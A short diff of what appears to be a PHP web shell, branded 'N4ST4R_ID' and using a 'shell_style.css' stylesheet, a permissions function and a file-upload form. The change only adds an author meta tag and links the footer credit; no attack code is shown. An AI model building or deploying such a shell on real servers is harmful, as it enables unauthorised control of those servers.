@@ -2,6 +2,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="N4ST4R_ID">
     <title>Na}{tarrr</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <link rel="stylesheet" href="https://naxtarrr.netlify.app/css/shell_style.css">
@@ -346,7 +347,7 @@ function hi_permission($items) {
 ?>
 </div>
 <div class="footer">
-  Coded & Designed By N4ST4R_ID
+  <a href="https://www.naxtarrr.my.id">Coded & Designed By N4ST4R_ID</a>
 </div>
 <script>
   const file = document.querySelector('input[type="file"]')
